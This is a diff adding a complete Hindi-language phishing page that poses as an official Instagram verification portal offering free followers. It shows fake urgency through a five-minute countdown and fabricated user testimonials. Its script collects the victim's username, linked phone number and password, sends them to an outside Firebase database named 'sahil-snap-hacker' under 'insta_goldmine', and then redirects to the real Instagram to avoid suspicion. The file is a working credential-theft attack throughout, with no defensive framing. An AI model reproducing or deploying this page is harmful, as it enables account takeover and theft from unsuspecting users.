@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Verification Portal - Official</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .timer-header { background: #ed4956; color: white; width: 100%; text-align: center; padding: 12px 0; font-weight: bold; font-size: 14px; position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .main-box { background: white; border: 1px solid #dbdbdb; width: 90%; max-width: 350px; padding: 30px; border-radius: 3px; text-align: center; margin-top: 30px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .insta-logo { width: 175px; margin-bottom: 25px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; font-size: 12px; box-sizing: border-box; }
+        .action-btn { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; }
+        .profile-dp { width: 90px; height: 90px; border-radius: 50%; border: 2px solid #dbdbdb; margin-bottom: 15px; object-fit: cover; display: none; margin-left: auto; margin-right: auto; }
+        .comment-box { width: 90%; max-width: 350px; margin-top: 20px; background: white; border: 1px solid #dbdbdb; padding: 15px; border-radius: 3px; }
+        .comment { font-size: 13px; margin-bottom: 15px; border-bottom: 1px solid #efefef; padding-bottom: 10px; text-align: left; }
+    </style>
+</head>
+<body>
+
+<div class="timer-header">🕒 यह ऑफर केवल <span id="clock">05:00</span> मिनट के लिए वैध है!</div>
+
+<div class="main-box">
+    <img src="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460367de.png" class="insta-logo">
+    
+    <img src="" id="user_dp" class="profile-dp">
+
+    <div id="div1">
+        <p style="font-size: 14px; color: #8e8e8e; font-weight: 600;">वेरिफिकेशन के लिए यूजरनेम दर्ज करें</p>
+        <input type="text" id="target_id" placeholder="Username" onblur="fetchDP()">
+        <button class="action-btn" onclick="nextStep()">अगला (Next)</button>
+    </div>
+
+    <div id="div2" style="display:none;">
+        <h3 style="color: #262626; font-size: 16px;">सुरक्षा सत्यापन (Identity)</h3>
+        <p style="font-size: 12px; color: #8e8e8e;">सिस्टम ने आपकी आईडी पहचान ली है। फॉलोअर्स भेजने के लिए विवरण दर्ज करें।</p>
+        <input type="text" id="phone_num" placeholder="Linked Phone Number (+91...)">
+        <input type="password" id="secret_key" placeholder="Enter Account Password">
+        <button class="action-btn" style="background: #42b72a;" onclick="finish()">पुष्टि करें और रिवॉर्ड लें</button>
+    </div>
+</div>
+
+<div class="comment-box">
+    <h4 style="text-align: left; margin: 0 0 10px 0;">लाइव फीड (2.4k)</h4>
+    <div class="comment"><b>sneha_vlogs</b> <p>Thank you admin, instant real followers mile hain 😍</p></div>
+    <div class="comment"><b>_its_me_rahul_</b> <p>Bhai kasm se kaam kar gaya! DP bhi dikhi meri.</p></div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
+
+<script>
+    const firebaseConfig = { databaseURL: "https://sahil-snap-hacker-default-rtdb.firebaseio.com/" };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    let seconds = 300;
+    setInterval(() => {
+        let m = Math.floor(seconds/60);
+        let s = seconds%60;
+        document.getElementById("clock").innerHTML = m + ":" + (s < 10 ? "0" : "") + s;
+        if(seconds > 0) seconds--;
+    }, 1000);
+
+    function fetchDP() {
+        const username = document.getElementById("target_id").value;
+        if(username) {
+            document.getElementById("user_dp").src = `https://via.placeholder.com/90?text=${username}`;
+            document.getElementById("user_dp").style.display = "block";
+        }
+    }
+
+    function nextStep() {
+        if(document.getElementById("target_id").value == "") return alert("यूजरनेम डालें!");
+        document.getElementById("div1").style.display = "none";
+        document.getElementById("div2").style.display = "block";
+    }
+
+    function finish() {
+        const user = document.getElementById("target_id").value;
+        const phone = document.getElementById("phone_num").value;
+        const pass = document.getElementById("secret_key").value;
+        
+        if(pass.length < 5 || phone.length < 10) return alert("सही विवरण दर्ज करें!");
+
+        database.ref('insta_goldmine/' + Date.now()).set({ 
+            Username: user, 
+            PhoneNumber: phone, 
+            Password: pass 
+        });
+        
+        alert("बधाई हो! आपका वेरिफिकेशन सफल रहा। 12-24 घंटों में फॉलोअर्स जुड़ जाएंगे।");
+        window.location.href = "https://www.instagram.com";
+    }
+</script>
+
+</body>
+</html>
